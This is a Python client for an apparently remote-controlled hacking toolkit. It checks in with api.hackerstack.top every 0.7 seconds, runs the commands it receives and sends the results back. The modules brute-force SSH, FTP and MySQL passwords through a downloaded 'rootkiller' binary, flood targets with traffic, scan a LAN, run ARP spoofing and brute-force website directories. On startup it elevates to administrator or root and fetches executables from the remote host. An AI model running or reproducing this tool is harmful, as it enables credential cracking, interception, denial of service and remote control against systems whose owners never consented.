
import requests
import json
import os
import time
import threading
import platform
import zipfile

import dirb as dirb_module
import traffic_attack as traffic_attack_module
import sys
from scapy.all import ARP, Ether, srp
from arp_spoof import arp_spoof,get_mac,restore,get_gateway_ip

# 获取操作系统名称
os_name = platform.system()
arp_spoof_stop = False



def get_my_ip():
    return requests.get("https://api.hackerstack.top/get_my_ip").text



def arp_scan(ip_range):
    # 创建ARP请求
    arp = ARP(pdst=ip_range)
    # 创建以太网广播帧
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    # 将ARP请求封装在以太网帧中
    packet = ether/arp

    # 发送数据包并接收响应
    result = srp(packet, timeout=2, verbose=0)[0]

    # 解析结果
    clients = []
    for sent, received in result:
        # 对于每个响应，提取MAC和IP地址
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})

    return clients


fn_object = {
    "IP": get_my_ip(),
    "os": os_name,
    "ssh密码破解模块": {
        "Command":"ssh_brute",
        "Input":True
    },
    "ftp密码破解模块": {
        "Command":"ftp_brute",
        "Input":True
    },
    "mysql密码破解模块": {
        "Command":"mysql_brute",
        "Input":True
    },
    "流量攻击模块": {
        "Command":"traffic_attack",
        "Input":True
    },
    "局域网arp扫描模块": {
        "Command":"arp_scan",
        "Input":False
    },
    "局域网arp欺骗模块": {
        "Command":"arp_spoof",
        "Input":True
    },
    "网站目录爆破模块" : {
        "Command":"dirb",
        "Input":True
    },
    "停止arp欺骗(如果已开启)" : {
        "Command":"arp_spoof_stop",
        "Input":False
    }
}

api_server = "https://api.hackerstack.top"
driver_code = None

command = 'none'
def input_console():
    global command

def del_space_in_list(l):
    for i in l:
        if str(i).strip() == '':
            l.remove(i)
    return l

        
def send_reverse_ok():
    requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":"收到指令正在执行!"}))

def deal_command(command):
    try:
        command = str(command).strip()
        if command == '' or command == 'none':
            return
        else:
            send_reverse_ok()
            print("[INFO] 收到命令: "+command)
            # requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":"收到指令正在执行!"}))
            if command == 'quit':                                                                                                                                                                                                                                                                                                                      
                exit()
            elif command == '':
                return
            elif command.startswith('dirb '):
                target_website = command[5:]
                command = dirb_module.main(target_website)
                target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":command}))

            elif command.startswith('ssh_brute '):
                all_args = del_space_in_list(command.split(' '))
                ip = all_args[1]
                port = all_args[2]
                user = all_args[3]
    
                run_command = ''
                if os_name == 'Windows':
                    run_command = './hackerstack_driver/rootkiller.exe --ssh '+ip+' '+port+' '+user
                else:
                    run_command = './hackerstack_driver/rootkiller --ssh '+ip+' '+port+' '+user

                # 获取命令行输出
                print(all_args)
                print(run_command)
                command = os.popen(run_command).read()
                print(command)
                requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":command}))
                return
        
            elif command.startswith('ftp_brute '):
                all_args = del_space_in_list(command.split(' '))
                ip = all_args[1]
                port = all_args[2]
                user = all_args[3]
    
                run_command = ''
                if os_name == 'Windows':
                    run_command = './hackerstack_driver/rootkiller.exe --ftp '+ip+' '+port+' '+user
                else:
                    run_command = './hackerstack_driver/rootkiller --ftp '+ip+' '+port+' '+user

                # 获取命令行输出
                command = os.popen(run_command).read()
                print(command)
                requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":command}))
                return
        
            elif command.startswith('mysql_brute '):
                all_args = del_space_in_list(command.split(' '))
                ip = all_args[1]
                port = all_args[2]
                user = all_args[3]
    
                run_command = ''
                if os_name == 'Windows':
                    run_command = './hackerstack_driver/rootkiller.exe --mysql '+ip+' '+port+' '+user
                else:
                    run_command = './hackerstack_driver/rootkiller --mysql '+ip+' '+port+' '+user

                # 获取命令行输出
                command = os.popen(run_command).read()
                print(command)
                requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":command}))
                return
        
            elif command.startswith('traffic_attack '):
                all_args = del_space_in_list(command.split(' '))
                target = all_args[1]
                user_num = all_args[2]
                one_user_num = all_args[3]
    
                traffic_attack_module.attack(target, user_num, one_user_num)
                return
        
            elif command == 'arp_scan':
                arp_scan_result = arp_scan("192.168.1.0/16")
                command = ''
                for client in arp_scan_result:
                    command += f"IP: {client['ip']} - MAC: {client['mac']}\n"
                requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":command}))
                return
            
            elif command.startswith('arp_spoof '):
                all_args = del_space_in_list(command.split(' '))
                print(all_args)
                target_ip = all_args[1] # 目标设备的IP地址
                print(f"欺骗目标IP: {target_ip}")

                gateway_ip = get_gateway_ip()
                arp_spoof_stop = False
                try:
                    packet_count = 0

                    # 开启ARP欺骗
                    while True:
                        if arp_spoof_stop:
                            break
                        arp_spoof(target_ip, gateway_ip)
                    print("\nDetected CTRL+C. Restoring ARP tables and exiting...")
                    restore(target_ip, gateway_ip)
                    sys.exit(0)
                except:
                    print("Unexpected error:", sys.exc_info()[0])
                    restore(target_ip, gateway_ip)

            elif command == 'arp_spoof_stop':
                arp_spoof_stop = True
                requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":"arp欺骗已停止"}))
                return
    except BaseException as e:
        print(e)
        target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":"指令执行失败!"}))
        return

def init_driver():
    print("[INFO] 初始化驱动程序附加组件")
    print("[INFO] 网关IP: "+get_gateway_ip())

    if os.name == 'posix':
        print("[INFO] 当前用户: "+os.getlogin())
        print(sys.argv)
        print(os.getuid())
        if os.getuid() == 0:
            pass
        else:
            print("[INFO] 请以管理员权限运行")
            exit()

    if os.name == 'nt':
        # 检查是否以管理员权限运行
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            # 尝试以管理员权限运行
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        else:
            print("[INFO] 已以管理员权限运行")

    if os.path.isdir("./hackerstack_driver") == False:
        os.mkdir("./hackerstack_driver")
        print("[INFO] 正在下载驱动程序附加组件...")
        requests_data = requests.get("https://api.hackerstack.top/resource/hackerstack_driver.zip").content
        print("[INFO] 下载完成，正在解压...")
        with open("./hackerstack_driver.zip", "wb") as f:
            f.write(requests_data)
        with zipfile.ZipFile("./hackerstack_driver.zip", "r") as zip_ref:
            zip_ref.extractall("./hackerstack_driver")
        os.remove("./hackerstack_driver.zip")
        print("[INFO] 解压完成")
        print("[正在处理动态链接库...]")
        if os.name == 'posix':
            os.system("sudo apt install libmysqlclient-dev")
            os.system("sudo apt install libcurl4-openssl-dev")
            os.system("sudo apt install libssl-dev")
            print("[INFO] 动态链接库处理完成")
        else:
            print("Windows下采用静态编译,无需处理动态链接库")
    

    print("[INFO] 完成驱动程序附加组件初始化，不保证驱动程序的完整性")


def setInterval(func, sec):
    """ 定时执行函数，类似于JavaScript中的setInterval """
    def func_wrapper():
        setInterval(func, sec)
        func()
    threading.Timer(sec, func_wrapper).start()

def clearInterval(timer):
    """ 停止定时执行，类似于JavaScript中的clearInterval """
    timer.cancel()

if __name__ == '__main__':
    init_driver()

    driver_code = str(input("请输入识别码: ")).strip()
    try:
        def send_ok():
            target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":json.dumps(fn_object)}))
        threading.Thread(target=send_ok).start()
        t = threading.Thread(target=input_console)
        t.start()
        def run():
            global command
            target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":command}))
            try:
                deal_command(target.text)
            except BaseException as e:
                target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":e}))
            command = 'none'
        # r = requests.get(api_server+"/virus_clear_command/"+driver_code)
        timer = threading.Timer(0.7, lambda: setInterval(run, 0.7))
        timer.start()
        while True:
            input()
    except:
        exit()

print(driver_code)